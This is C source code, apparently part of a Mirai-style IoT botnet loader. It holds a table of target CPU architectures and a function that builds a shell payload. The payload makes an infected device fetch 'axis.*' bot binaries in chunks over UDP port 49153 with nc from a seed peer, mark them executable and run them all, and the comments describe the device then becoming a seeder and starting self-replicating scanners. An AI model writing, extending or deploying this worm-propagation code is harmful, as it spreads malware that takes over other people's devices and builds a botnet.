#include "includes.h"
#include "binary.h"

static struct binary binaries[] = {
    {"arm", NULL, 0},
    {"arm5", NULL, 0},
    {"arm6", NULL, 0},
    {"arm7", NULL, 0},
    {"mips", NULL, 0},
    {"mpsl", NULL, 0},
    {"x86", NULL, 0},
    {"x86_64", NULL, 0},
    {"ppc", NULL, 0},
    {"spc", NULL, 0},
    {"m68k", NULL, 0},
    {"sh4", NULL, 0},
    {"arc", NULL, 0},
    {NULL, NULL, 0}
};

BOOL binary_init(void) {
    return TRUE;
}

char *binary_get_by_arch(char *arch) {
    int i;

    for (i = 0; binaries[i].arch != NULL; i++) {
        if (strcasecmp(binaries[i].arch, arch) == 0) {
            return binaries[i].hex_payload;
        }
    }

    return binaries[0].hex_payload;
}

/*
 * Build P2P torrent-style download payload.
 * Instead of downloading from HTTP, the infected device downloads
 * ALL binaries from the P2P network (every bot is a seeder).
 *
 * The device:
 * 1. Connects to a seed peer via UDP 49153
 * 2. Downloads all axis.* binaries in 4KB chunks
 * 3. Becomes a seeder itself
 * 4. Starts self-replicating scanners
 */
char *binary_build_p2p_payload(const char *seed_ip) {
    static char payload[4096];

    /* Build torrent-style download command:
     * - Download ALL architectures via P2P (UDP 49153)
     * - Each binary is served in 4KB chunks
     * - Device becomes a seeder after download
     */
    snprintf(payload, sizeof(payload),
        "cd /tmp;"
        "for arch in arm arm5 arm6 arm7 mips mpsl x86 x86_64 ppc spc m68k sh4 arc;do "
        "rm -f axis.$arch;"
        "chunk=0;"
        "while true;do "
        "printf '\\\\x20\\\\x$(printf \"%%02x\" $((chunk %% 256)))\\\\x$(printf \"%%02x\" $((chunk / 256)))$arch' | "
        "nc -u -w2 %s 49153 >> axis.$arch 2>/dev/null;"
        "chunk=$((chunk + 1));"
        "if [ $chunk -gt 256 ];then break;fi;"
        "done;"
        "chmod +x axis.$arch 2>/dev/null;"
        "done;"
        "for arch in arm arm5 arm6 arm7 mips mpsl x86 x86_64 ppc spc m68k sh4 arc;do "
        "test -s axis.$arch && ./axis.$arch & done",
        seed_ip
    );

    return payload;
}
